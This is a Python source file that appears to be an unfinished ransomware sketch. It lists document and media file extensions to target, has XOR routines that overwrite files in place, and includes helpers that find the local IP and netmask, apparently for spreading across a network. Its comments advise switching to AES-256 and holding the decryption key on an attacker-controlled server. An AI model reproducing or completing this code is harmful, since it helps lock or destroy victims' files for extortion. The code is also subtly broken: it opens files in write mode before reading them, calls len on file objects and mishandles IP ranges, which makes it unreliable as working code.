import sys
import random
import socket

extensions = ['pdf', 'doc', 'docx', 
              'html', 'htm', 'xls', 
              'xlsx', 'txt', 'jpg',
              'png', 'mp4', 'ppt']

ip_classes = {
    'Class A': {
        'range': [0, 127],
        'mask': '255.0.0.0'
    },
    'Class B': {
        'range': [128, 191],
        'mask': '255.255.0.0'
    },
    'Class C': {
        'range': [192, 223],
        'mask': '255.255.255.0'
    }
}

#Generates key for encryption and decryption
#Would be best to generate decryption key
#on attacker controlled server and fetch it
def generate_key():
    key = random.randrange(1000, 9999)
    return key

key = generate_key()

#Using XOR encoding with key saved in memory
#To make more effective use AES-256
#With decryption key saved on an attacker controlled server
def encode(file):
    #Defines file to be encrypted and key
    cleartext = open(file, 'w')
    
    #Amount of times key needs to be repeated
    reps = (len(cleartext) - 1) // len(key) + 1
    
    #Returns binary object
    a1 = cleartext.encode('utf-8')

    #Truncates or Expands key length to be equal to text length
    #And puts it in binary object
    key = (key * reps)[:len(cleartext)].encode('utf-8')
    
    #XOR encryption and saves to file
    cipher = bytes([i1 ^ i2 for (i1, i2) in zip(a1, key)])
    open(file, 'wb').write(cipher)

#Decodes the XOR encryption
def decode(file):
    #Defines file to be decrypted
    cipher = open(file, 'rb').read()

    #Amount of times key needs to be repeated
    reps = (len(cipher) - 1) // len(key) + 1

    #Truncates or expands key length
    key = (key * reps)[:len(cipher)].encode('utf-8')

    #Decodes the content
    clear = bytes([i1 ^ i2 for (i1, i2) in zip(cipher, key)])

    #Saves the cleartext to the encoded file
    open(file, 'wb').write(clear.decode('utf-8'))

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #Connects to localhost on port 0
    s.connect(('10.0.0.0', 0))
    local_ip = s.getsockname()[0]
    return local_ip

def get_netmask():
    local_ip = get_local_ip()
    first_octet = local_ip[0:3]

    if (local_ip in range(ip_classes['Class A']['range'])):
        return ip_classes['Class A']['mask']
    
    elif (local_ip in range(ip_classes['Class B']['range'])):
        return ip_classes['Class B']['mask']
    
    elif (local_ip in range(ip_classes['Class C']['range'])):
        return ip_classes['Class C']['mask']
    
    else:
        return False
